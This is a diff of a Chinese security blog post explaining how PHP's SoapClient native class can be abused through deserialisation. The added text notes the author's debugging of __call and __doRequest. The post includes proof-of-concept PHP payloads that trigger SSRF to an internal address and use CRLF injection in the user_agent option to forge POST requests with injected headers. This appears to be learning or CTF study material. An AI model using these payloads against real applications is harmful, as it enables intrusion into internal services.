@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      619 字
+      754 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      10
        分钟
     </span>
   
@@ -247,7 +247,13 @@
 <p>这个原生类的主要作用就在于触发它的<code>__call</code>方法来导致SSRF打内网的效果。先简单看网上的几个样例。</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;bbb&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;not_exists_function();<br></code></pre></div></td></tr></table></figure>
 
-<p>然后在本机上监听一下，但是很疑惑的是<code>call</code>方法到底是怎么实现的，看了很多文章都没介绍为啥，正常将call方法第一个传参的是调用的方法名，后面是参数，这个竟然能请求到自己设置的服务地址，大受震撼。</p>
+<p>然后在本机上监听一下，但是很疑惑的是<code>call</code>方法到底是怎么实现的，看了很多文章都没介绍为啥，正常将call方法第一个传参的是调用的方法名，后面是参数，这个竟然能请求到自己设置的服务地址，大受震撼。这里简单调试了一下大概能懂一点。</p>
+<p>实例化一个soapclient内容如下，还有后面两个参数。<br><img src="https://img-blog.csdnimg.cn/a73a9b8fcdb648b7b2293536cafd3a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>查看了一下文档和<code>SoapClient-&gt;__doRequest</code>方法有关</p>
+<p><img src="https://img-blog.csdnimg.cn/cb545f31b3b84873ae1a337d02b03a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这个会向服务地址发起请求，然后看了一下源码执行后的打印结果。</p>
+<p><img src="https://img-blog.csdnimg.cn/b005026ce0994500a58e1c4372925c43.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里<code>SoapClient-&gt;__doRequest</code>的第一个参数为xml格式内容，第二个应该就是请求地址，最后是<code>uri</code>和调用的不存在方法。<code>call</code>方法的实现应该会用到<code>SoapClient-&gt;__doRequest</code>但还是没太懂。</p>
 <p><img src="https://img-blog.csdnimg.cn/c1c25c79cb89430f8b2bb3ab3d2d2be7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>这里还存在clrf漏洞,可以伪造post请求。</p>
 <figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span> = unserialize(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span>-&gt;sdadasd();<br></code></pre></div></td></tr></table></figure>
